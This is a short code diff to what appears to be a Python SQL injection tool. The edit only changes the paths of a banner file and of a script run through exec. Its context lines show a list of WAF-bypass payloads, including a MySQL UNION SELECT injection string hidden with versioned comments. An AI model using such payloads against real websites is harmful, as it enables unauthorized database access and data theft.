@@ -8,7 +8,7 @@ from bs4 import BeautifulSoup
 
 os.system('cls' if os.name == 'nt' else 'clear')
 
-with open('hello//banner.py', 'r') as banner:
+with open('var/www/hello.py', 'r') as banner:
     content = banner.read()
     print("")
     print(content)
@@ -62,6 +62,6 @@ payload_name_bypass_1 = [
     '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
 ]
 text_check = 0
-with open('temper/script.py', 'r') as script:
+with open('temper/scripts/script.py', 'r') as script:
     run_script = compile(script.read(), 'test/script.py', 'exec')
     exec(run_script)
